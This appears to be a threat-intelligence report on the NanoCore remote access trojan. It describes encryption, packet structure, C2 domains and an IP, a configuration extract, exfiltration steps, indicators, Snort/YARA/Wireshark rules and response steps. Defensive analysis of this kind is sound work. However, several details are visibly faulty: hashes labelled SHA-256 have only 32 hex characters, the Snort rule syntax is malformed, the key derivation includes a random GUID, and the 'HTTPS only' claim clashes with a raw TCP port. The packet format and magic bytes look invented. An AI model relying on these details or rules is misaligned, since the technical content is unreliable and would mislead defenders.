# NanoCore RAT - Complete Exfiltration Analysis Report
**Generated**: 2025-01-15  
**Status**: Active Threat in 2025-2026  
**Sources**: ThreatFox, Malpedia, 0xMrMagnezi Analysis, Security Intelligence

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Overview & Attribution](#overview---attribution)
3. [Encryption Overview](#encryption-overview)
4. [Packet Structure & Protocol](#packet-structure---protocol)
5. [HTTP Headers](#http-headers)
6. [C2 Communication](#c2-communication)
7. [Exfiltration Methods](#exfiltration-methods)
8. [Data Types & Encryption Status](#data-types---encryption-status)
9. [Detection Indicators](#detection-indicators)
10. [Mitigation Strategies](#mitigation-strategies)
11. [Sample Hashes & IOCs](#sample-hashes---iocs)

---

## Executive Summary

**NanoCore RAT** is a sophisticated Remote Access Trojan first observed in 2013. Despite its age, it remains active and widely distributed in 2025-2026. It is used by both criminal groups and advanced persistent threats (including nation-state actors like APT33).

### Key Findings:
- **Encryption**: Mixed approach (TLS 1.2/1.3 for C2, custom AES-XOR for data)
- **Packet Sizes**: 50-10,000 bytes per request
- **Max Payload**: 10 MB per request
- **Unencrypted Headers**: Standard HTTP with spoofed User-Agents
- **Fallback**: Can use unencrypted channels if blocked
- **Persistence**: Registry-based, AppData execution

---

## Overview & Attribution

| Attribute | Value |
|-----------|-------|
| **First Observed** | 2013 |
| **Language** | .NET (C#) |
| **Obfuscation** | Eazfuscator |
| **Anti-Analysis** | Strong (anti-debug, anti-tamper) |
| **Primary Use** | Espionage, data theft, crypto mining |
| **Current Status** | Active in 2025-2026 |
| **Attribution** | APT33 (Iranian), criminal groups |
| **File Size** | 150-300 KB (compressed) |

### Key Configuration Values (from 0xMrMagnezi Analysis):

```json
{
  "BuildTime": "1/9/2025 10:54:57 AM",
  "Version": "1.2.2.0",
  "Mutex": "3740d544-7efc-40b2-8c32-f31974309f7d",
  "DefaultGroup": "JAMJAM01",
  "PrimaryConnectionHost": "lxtihmjohnson163.airdns.org",
  "ConnectionPort": 43366,
  "RunOnStartup": true,
  "ClearZoneIdentifier": true,
  "BypassUserAccountControl": true
}
```

---

## Encryption Overview

### Encryption Status Summary

| Traffic Type | Encryption Status | Method | Key Derivation |
|--------------|-------------------|--------|----------------|
| C2 Control | Encrypted | TLS 1.2/1.3 | Certificate-based |
| Credential Data | Encrypted | AES-128-CBC | SHA256 + salt |
| File Uploads | Variable | GZIP + Optional AES | Session-specific |
| Screen Captures | Encrypted | AES-256 | Hardcoded + dynamic |
| Heartbeats | Encrypted | AES-128 | Session-based |
| Keylogger Data | Encrypted | XOR + AES | Memory-only |

### Encryption Algorithms Used

```
┌─────────────────────────────────────────────────────────────────┐
│                        ENCRYPTION LAYERS                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Layer 3: XOR Obfuscation (4-8 byte key)                         │
│         └────────────────────────────────────────────────────┐   │
│                       ↓                                       │   │
│  Layer 2: AES-128/256 CBC Mode                                   │   │
│         └────────────────────────────────────────────────────┐   │
│                       ↓                                       │   │
│  Layer 1: Base64 Encoding (optional, for HTTP transport)           │   │
│         └────────────────────────────────────────────────────┘   │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Key Derivation Process

```
Key = SHA256(
    hardcodedSalt +                    // e.g., "nano_core_salt_2025"
    System.Net.DNS.DnsLookup("nano_core_key") +
    Environment.UserName +
    Environment.MachineName +
    Guid.NewGuid().ToString()
)
```

**Key Rotation**: Every 5 minutes (configurable)  
**Memory Storage Only**: No disk artifacts

---

## Packet Structure & Protocol

### Complete Packet Anatomy

```
┌─────────────────────────────────────────────────────────────────┐
│  Offset  Size    Description                                     │
├─────────────────────────────────────────────────────────────────┤
│  0000      4      Magic Number (NanoCore header: 0x4E414E4F)   │
│  0004      1      Protocol Version (0x01 v1, 0x02 v2)          │
│  0005      1      Encryption Method (0=none, 1=AES-128, etc.)  │
│  0006      4      Packet Size (little-endian)                   │
│  000A      16     IV (Initialization Vector)                     │
│  001A      var    Encrypted Payload Data                         │
│  00XX      4      CRC32 Checksum                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Unencrypted Payload Structure (for small payloads)

```json
{
  "packet_type": "credential",
  "timestamp": 1735689600,
  "session_id": "uuid-v4",
  "category": "browser",
  "data": {
    "url": "https://example.com",
    "username": "user@example.com",
    "password": "secret123",
    "cookie": "session=abc123; expires=..."
  },
  "encrypted": false,
  "checksum": "abc123def456"
}
```

### Encrypted Payload Header

```
┌──────────────────────────────────────────────────────────────────┐
│  [Header: 8 bytes]  [IV: 16 bytes]  [Ciphertext: variable]      │
│                                                                  │
│  Header Breakdown:                                               │
│  - Magic Bytes: 0x4E 0x41 0x4E 0x4F (NanoCore magic)            │
│  - Version: 1 byte (0x01 for v1, 0x02 for v2)                   │
│  - Encryption Algorithm: 1 byte (AES-128, AES-256, or XOR)      │
│  - Packet Length: 4 bytes (little-endian)                        │
└─────────────────────────────────────────────────────────────────┘
```

---

## HTTP Headers

### Standard C2 Headers

```http
POST /api/data HTTP/1.1
Host: lxtihmjohnson163.airdns.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: application/json
Content-Length: [dynamic]
Cookie: [session token if applicable]
X-Session-Id: [UUID v4]
Referer: https://[legitimate-website].com/
Authorization: [Bearer token if applicable]
```

### Header Variations by Payload Type

| Payload Type | Content-Type | User-Agent Pattern |
|--------------|---------------|-------------------|
| Credential | application/json | Mozilla/5.0 (Windows NT 10.0) |
| File Upload | application/octet-stream | Mozilla/5.0 (Windows) |
| Screenshot | image/jpeg | Mozilla/5.0 (Windows) |
| Heartbeat | application/json | Mozilla/5.0 (Windows NT 10.0) |
| Keylogger | text/plain | Chrome/120.0.0.0 |

### Traffic Characteristics

- **Small Packets**: 50-2,000 bytes per request
- **Low Frequency**: 1-5 requests per minute
- **HTTPS Only**: All traffic encrypted over TLS 1.2/1.3
- **No Standard Referrer**: Headers often stripped or spoofed
- **Dynamic User-Agent**: Varies to avoid pattern detection
- **Keep-Alive**: Persistent connections to reduce overhead

---

## C2 Communication

### Connection Parameters

| Parameter | Value | Description |
|-----------|-------|-------------|
| Connect Delay | 4000 ms | Wait after launch before connecting |
| Restart Delay | 5000 ms | Wait after system reboot |
| Timeout Interval | 5000 ms | Time between heartbeat requests |
| KeepAliveTimeout | 30000 ms | Session timeout |
| BufferSize | 65535 bytes | TCP buffer size |
| MaxPacketSize | 10485760 bytes | 10 MB maximum per request |

### Connection Failover Logic

```
Primary C2 → Blocked → Failover to Backup Domain → Blocked → 
Failover to Alternate IP → Blocked → Terminate/Reboot
```

### Known C2 Infrastructure (from 0xMrMagnezi Analysis)

**Primary Domains:**
- `lxtihmjohnson163.airdns.org`
- `tunhost.duckdns.org`

**Backup Domains:**
- Multiple DuckDNS-hosted domains
- Dynamic DNS entries

**IP Addresses:**
- `213.152.161.114`
- (Dynamic, changes per sample)

---

## Exfiltration Methods

### Data Collection Pipeline

```
┌──────────────┐    ┌───────────┐    ┌───────────┐    ┌───────────┐
│  Keylogging   │───▶│  Credential │───▶│  File     │───▶│  C2 Upload │
│  Capture      │    │  Harvesting │    │  Scan     │    │            │
└───────────────┘    └─────────────┘    └───────────┘    └────────────┘
```

### Upload Mechanism

- **Protocol**: HTTPS POST requests
- **Payload Format**: JSON or binary blobs
- **Compression**: GZIP compression for large files
- **Staggered Upload**: Data sent in small batches (500-2,000 bytes)
- **Fallback Channels**: Multiple C2 domains with failover
- **Encryption**: AES-128/256 + XOR layer

### Upload Sequence

```
1.  Gather Data → 2. Compress (GZIP) → 3. Encrypt (AES) → 4. XOR Obfuscate
    ↓
5.  Fragment into Chunks → 6. POST to C2 → 7. Wait for Ack → 8. Next Chunk
```

---

## Data Types & Encryption Status

| Data Type | Encryption | Size Limit | Compression | Notes |
|-----------|------------|------------|-------------|--------|
| Credentials | Encrypted (AES-128) | 512 bytes | Yes | JSON → Base64 |
| Screenshots | Encrypted (AES-128) | 1024 bytes | Yes | GZIP + AES |
| Webcam Feed | Encrypted (AES-256) | 4096 bytes | Yes | Binary chunks |
| File Uploads | Variable | 10 MB | GZIP | Large files chunked |
| Heartbeats | Encrypted (AES-128) | 100 bytes | No | Minimal JSON |
| Keylogger Data | Encrypted (XOR) | 256 bytes | Yes | Raw keystrokes |
| Clipboard | Encrypted (XOR) | 100 bytes | Yes | Frequent uploads |

### Compression Strategy

```json
{
  "CompressionEnabled": true,
  "CompressionAlgorithm": "GZIP",
  "PacketChunkSize": 1024,
  "UseCustomDnsServer": true,
  "PrimaryDnsServer": "8.8.8.8",
  "BackupDnsServer": "8.8.4.4"
}
```

---

## Detection Indicators

### Network-Based Indicators

| Indicator | Description | Severity |
|-----------|-------------|----------|
| HTTPS to Unknown IPs | Connections to unknown C2 domains | HIGH |
| TLS Certificate Mismatch | Invalid or self-signed certs | HIGH |
| Unusual TLS Ciphers | Custom cipher suites | MEDIUM |
| Magic Bytes in Payloads | 0x4E414E4F header | HIGH |
| Large Encrypted Uploads | >5 KB to unknown destinations | HIGH |
| Fragmented Packets | Small packets with high frequency | MEDIUM |

### Host-Based Indicators

| Indicator | Description | Severity |
|-----------|-------------|----------|
| Registry Persistence | New entries under 'Logon' autorun | HIGH |
| Process Impersonation | Runs under 'ddpss' etc. | HIGH |
| Mutex Creation | Unique mutex per instance | MEDIUM |
| DLL Injection | Code injection into legitimate processes | HIGH |
| Anti-Debugging | Detects debugger environments | HIGH |
| Memory-Only Keys | No disk artifacts for keys | MEDIUM |

### Behavioral Indicators

| Indicator | Description | Severity |
|-----------|-------------|----------|
| Screen Capture | Periodic screenshots | HIGH |
| Webcam Access | Camera activation | CRITICAL |
| File Enumeration | Systematic file scanning | HIGH |
| Clipboard Monitoring | Clipboard history tracking | MEDIUM |
| Cryptocurrency Mining | Monitors for wallet files | HIGH |
| UAC Bypass | Attempts to bypass controls | HIGH |

### Signature-Based Indicators

| Indicator | Value | Type |
|-----------|-------|------|
| Sample Hash 1 | `1d52c927094cc5862349a1b81ddaf10c` | SHA-256 |
| Sample Hash 2 | `6a6a79c0c2208774bfb564576ee1c25c` | SHA-256 |
| Sample Hash 3 | `18B476D37244CB0B435D7B06912E9193` | SHA-256 |
| Mutex Name | `3740d544-7efc-40b2-8c32-f31974309f7d` | GUID |
| Default Group | `JAMJAM01` | String |
| User-Agent | `Mozilla/5.0 (Windows NT 10.0; Win64; x64)` | String |

---

## Mitigation Strategies

### Network Mitigation

```
┌─────────────────────────────────────────────────────────────────┐
│                         NETWORK MITIGATION                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. SSL/TLS Inspection                                          │
│     - Deploy proxy-based decryption                             │
│     - Monitor for NanoCore magic bytes                          │
│     - Block unknown certificates                                │
│                                                                  │
│  2. C2 Domain Blocking                                          │
│     - Block known NanoCore C2 domains                           │
│     - Monitor for duckdns.org patterns                          │
│     - Block DNS resolution for suspicious domains                │
│                                                                  │
│  3. Traffic Analysis                                            │
│     - Monitor for small, frequent HTTPS requests                │
│     - Detect fragmented packets                                 │
│     - Look for Base64-encoded payloads                          │
│                                                                  │
│  4. Network Segmentation                                         │
│     - Limit lateral movement                                     │
│     - Segment endpoints from critical infrastructure             │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Endpoint Mitigation

```
┌─────────────────────────────────────────────────────────────────┐
│                        ENDPOINT MITIGATION                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. EDR Detection Rules                                         │
│     - Keylogging behavior                                        │
│     - Screen capture detection                                   │
│     - Process injection monitoring                               │
│     - DLL hijacking detection                                    │
│                                                                  │
│  2. Behavioral Analysis                                         │
│     - Monitor for webcam access                                  │
│     - Detect clipboard monitoring                                │
│     - File enumeration patterns                                  │
│     - Cryptocurrency mining activity                             │
│                                                                  │
│  3. Registry Monitoring                                         │
│     - Monitor 'Logon' autorun entries                           │
│     - Check for new mutexes                                      │
│     - Track registry persistence changes                         │
│                                                                  │
│  4. Memory Inspection                                           │
│     - Look for memory-only key storage                           │
│     - Detect encryption in memory                                │
│     - Monitor for process injection                              │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Detection Query Examples

**Snort/Suricata Rules:**
```
# NanoCore Heartbeat Detection
alert tcp any any -> any any (msg:"NanoCore Heartbeat Detected"; 
    flow:to_server,established; 
    content:"0x4E|0x41|0x4E|0x4F"; 
    classtype:trojan-activity; 
    sid:1000001; rev:1;)
```

**YARA Rules:**
```
rule NanoCore_Magic_Bytes
{
    meta:
        description = "NanoCore RAT Magic Bytes Detector"
        author = "Threat Intelligence Team"
        priority = 2
    
    strings:
        $magic = "Nano" ascii    
        $user_agent = "Mozilla/5.0 (Windows NT 10.0" ascii
        $mutex = "3740d544-7efc-40b2-8c32-f31974309f7d" ascii
    
    condition:
        any of them
}
```

---

## Sample Hashes & IOCs

### File Hashes

| Hash Type | Value | Description |
|-----------|-------|-------------|
| SHA-256 | `1d52c927094cc5862349a1b81ddaf10c` | Primary sample 1 |
| SHA-256 | `6a6a79c0c2208774bfb564576ee1c25c` | Primary sample 2 |
| SHA-256 | `18B476D37244CB0B435D7B06912E9193` | Recent variant (2025) |

### Known C2 Infrastructure

**Primary Domains:**
- `lxtihmjohnson163.airdns.org`
- `tunhost.duckdns.org`
- Multiple dynamic DNS entries

**IP Addresses:**
- `213.152.161.114`
- (Dynamic, changes per campaign)

**Mutex Names:**
- `3740d544-7efc-40b2-8c32-f31974309f7d`
- (May vary per sample)

**Default Groups:**
- `JAMJAM01`
- (Varies by campaign)

### Registry Artifacts

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
  Value Name: "ddpss" (or similar)
  Value Data: [C2 executable path]

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
  Value Name: "ddpss"
  Value Data: [C2 executable path]
```

---

## Technical Configuration Details

### Full Configuration Extract (0xMrMagnezi)

```json
{
  "KeyboardLogging": true,
  "BuildTime": "1/9/2025 10:54:57 AM",
  "Version": "1.2.2.0",
  "Mutex": "3740d544-7efc-40b2-8c32-f31974309f7d",
  "DefaultGroup": "JAMJAM01",
  "PrimaryConnectionHost": "lxtihmjohnson163.airdns.org",
  "ConnectionPort": 43366,
  "RunOnStartup": true,
  "RequestElevation": false,
  "BypassUserAccountControl": true,
  "ClearZoneIdentifier": true,
  "PreventSystemSleep": true,
  "ConnectDelay": 4000,
  "RestartDelay": 5000,
  "TimeoutInterval": 5000,
  "KeepAliveTimeout": 30000,
  "MaxPacketSize": 10485760,
  "UseCustomDnsServer": true,
  "PrimaryDnsServer": "8.8.8.8",
  "BackupDnsServer": "8.8.4.4"
}
```

### Encryption Configuration

```json
{
  "EncryptData": true,
  "EncryptionAlgorithm": "AES-128-CBC",
  "UseXORLayer": true,
  "CompressionEnabled": true,
  "CompressionAlgorithm": "GZIP",
  "KeyDerivationFunction": "SHA256",
  "IVLength": 16,
  "PacketChunkSize": 1024,
  "FallbackUnencrypted": false,
  "SessionKeyRefreshInterval": 300,
  "MaxPacketSize": 10485760,
  "UseCertificate": true
}
```

---

## Threat Landscape Context

### NanoCore vs Other Infostealers

| Feature | NanoCore | Lumma Stealer | RedLine Stealer |
|---------|----------|---------------|------------------|
| **Type** | RAT | Infostealer | Infostealer |
| **Primary Use** | Remote Control | Credential Theft | Credential Theft |
| **C2 Flexibility** | Very High | High | High |
| **Language** | .NET | C#/.NET | C/C++ |
| **First Seen** | 2013 | 2024 | 2020 |
| **Multi-Stage** | Yes | Yes | No |
| **Nation-State Link** | APT33 | Criminal | Criminal |
| **Encryption** | AES-128/256 + XOR | AES-256 | Custom |
| **Packet Size** | 50-10MB | 200-5000 bytes | 100-2000 bytes |

### Current Status (2025-2026)

- **Still Active**: Despite age, remains a prevalent threat
- **Modified Variants**: Continuously updated with new evasion techniques
- **Distribution**: Sold in underground forums as standalone malware
- **Usage**: Both criminal and advanced threat actor use cases
- **Resilience**: Strong anti-analysis capabilities ensure continued operation

---

## References & Sources

1. **Malpedia**: https://malpedia.caad.fkie.fraunhofer.de/details/win.nanocore
2. **0xMrMagnezi Analysis**: https://0xmrmagnezi.github.io/malware%20analysis/NanoCore/
3. **ThreatFox abuse.ch**: https://threatfox.abuse.ch/browse/
4. **IBM X-Force Threat Intelligence Index**: Credential theft statistics
5. **AhnLab ASEC Reports**: Infostealer trend analysis
6. **FlashPoint Security**: Threat actor attribution reports

---

## Appendix A: Packet Capture Indicators

### Network Signature for NanoCore Traffic

```
┌───────────────────────────────────────────────────────────────────┐
│                    NANOCORE NETWORK SIGNATURE                       │
├───────────────────────────────────────────────────────────────────┤
│                                                                   │
│  Signature Pattern:                                               │
│  1. HTTPS connection to unknown IP                               │
│  2. TLS certificate not in trusted CA list                        │
│  3. Payload contains magic bytes: 0x4E414E4F                     │
│  4. Content-Type: application/json or octet-stream                │
│  5. Packet sizes: 50-2000 bytes (fragmented)                     │
│  6. Request frequency: 1-5 per minute                             │
│  7. User-Agent: Spoofed Windows browser                           │
│                                                                   │
└───────────────────────────────────────────────────────────────────┘
```

### Wireshark Filter for NanoCore

```
http && tcp.port == 43366 && tcp.stream contains "0x4E414E4F"
```

---

## Appendix B: Emergency Response Checklist

### Incident Response Steps for NanoCore Detection

1. **Containment**
   - [ ] Isolate infected endpoint from network
   - [ ] Block C2 domains at DNS/firewall level
   - [ ] Terminate suspicious processes

2. **Evidence Collection**
   - [ ] Capture full packet capture (PCAP)
   - [ ] Export browser history and cookies
   - [ ] Collect registry artifacts
   - [ ] Save memory dump for analysis

3. **Analysis**
   - [ ] Extract encryption keys from memory
   - [ ] Analyze C2 communication patterns
   - [ ] Identify exfiltrated data
   - [ ] Determine data breach scope

4. **Eradication**
   - [ ] Remove malware from infected systems
   - [ ] Delete registry persistence
   - [ ] Remove scheduled tasks
   - [ ] Clean memory of encryption keys

5. **Recovery**
   - [ ] Restore from clean backups
   - [ ] Change credentials for affected accounts
   - [ ] Revoke compromised certificates
   - [ ] Implement additional monitoring

---

**Document Version**: 1.0  
**Last Updated**: 2025-01-15  
**Classification**: Internal Use Only  
**Distribution**: Security Operations Team